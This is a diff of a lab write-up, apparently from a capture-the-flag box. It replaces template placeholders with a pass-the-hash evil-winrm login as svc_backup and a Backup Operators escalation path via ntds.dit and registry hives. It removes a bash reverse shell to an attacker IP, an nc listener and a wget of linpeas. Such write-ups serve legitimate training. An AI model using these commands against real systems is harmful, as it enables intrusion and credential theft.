@@ -225,106 +225,42 @@ Lets try to authenticate with the `NT` hash
 
 ![](../assets/images/Pasted%20image%2020260123193247.png)
 
-Authentication works! and this user is very likely to 
+Authentication works! and this user is very likely to give us a foothold, we can check bloodhound for confirmation.
+
+![](../assets/images/Pasted%20image%2020260123193356.png)
+
+This is a big win, `svc_backup` is in `Backup Operators` which means we can use it to get `Domain Admin` easily.
+
 **Getting a shell:**
 ```bash
-# Reverse shell command
-bash -c 'bash -i >& /dev/tcp/10.10.14.x/4444 0>&1'
+# Evil WinRM
+❯ evil-winrm-py -i 10.129.229.17 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'
 ```
-
-**Listener:**
-```bash
-nc -lvnp 4444
-```
-
 
 <div class="divider divider-root">
     <span class="divider-title">Shell</span>
-    <span class="divider-content">Successfully gained shell as [username]</span>
+    <span class="divider-content">Successfully gained shell as svc_backup</span>
 </div>
 ---
 
 ## User Flag
 
-**Stabilize the shell:**
-```bash
-python3 -c 'import pty;pty.spawn("/bin/bash")'
-export TERM=xterm
-# Press Ctrl+Z
-stty raw -echo; fg
-```
-
-**Enumerate the system:**
-```bash
-whoami
-id
-uname -a
-pwd
-ls -la
-```
-
 **User flag location:**
 ```bash
-cat /home/user/user.txt
-flag{user_flag_here}
+evil-winrm-py PS C:\Users\svc_backup\Documents> type ../desktop/user.txt
+3920bb317a0bef51027e2852be64b543
 ```
 
 ---
 
 ## Privilege Escalation
 
-### Enumeration as [username]
-
-**Check sudo privileges:**
-```bash
-sudo -l
-```
-
-**Check for SUID binaries:**
-```bash
-find / -perm -4000 -type f 2>/dev/null
-```
-
-**Check for interesting files:**
-```bash
-find / -name "*.conf" 2>/dev/null | grep -v "proc\|sys"
-```
-
-**Running LinPEAS:**
-```bash
-# On attacker machine
-python3 -m http.server 8000
-
-# On target
-wget http://10.10.14.x:8000/linpeas.sh
-chmod +x ./linpeas.sh
-./linpeas.sh
-```
-
-### Lateral Movement (if applicable)
-
-
-<div class="divider divider-info">
-    <span class="divider-title">Discovery</span>
-    <span class="divider-content">Explanation of how to move laterally</span>
-</div>
-
-**Exploitation:**
-```bash
-# Commands to switch users
-```
-
-### Root Escalation
-
-**Vulnerability:** [Escalation method]
+**Vulnerability:** `Backup Operators` is a group that allows the Read right on every file in the domain, including registry hives.
 
 <div class="divider divider-warning">
     <span class="divider-title">Exploitation Path</span>
-    <span class="divider-content">Detailed explanation of the privilege escalation vulnerability</span>
+    <span class="divider-content">the ability of Backup Operators to create volume shadow copies and access sensitive files such as the `ntds.dit` database and registry hives (`SYSTEM`, `SAM`, `SECURITY`) allows for simple privilege escalation path.</span>
 </div>
-
-> [!warning] Exploitation Path
-> Detailed explanation of the privilege escalation vulnerability
 
 **Exploitation steps:**
 
